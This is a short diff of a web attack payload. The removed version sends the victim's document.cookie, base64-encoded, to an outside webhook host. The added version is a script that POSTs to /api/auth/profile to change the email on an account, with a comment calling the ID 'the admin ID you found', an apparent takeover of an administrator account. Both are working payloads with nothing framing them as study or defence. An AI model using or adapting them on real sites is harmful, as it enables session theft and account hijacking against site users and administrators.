@@ -1,9 +1,12 @@
-
-<!DOCTYPE html>
-<html>
-  <body>
-   <script>
-  fetch('https://webhooksite.net/9299acf8-393a-4d83-9963-c5763588fb5e/?cookie=' + btoa(document.cookie));
+<script>
+  fetch('/api/auth/profile', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      id: "69d28e841cda77b519a9550e", // The admin ID you found
+      email: "ladybughuner1@gmail.com"
+    })
+  });
 </script>
-  </body>
-</html>
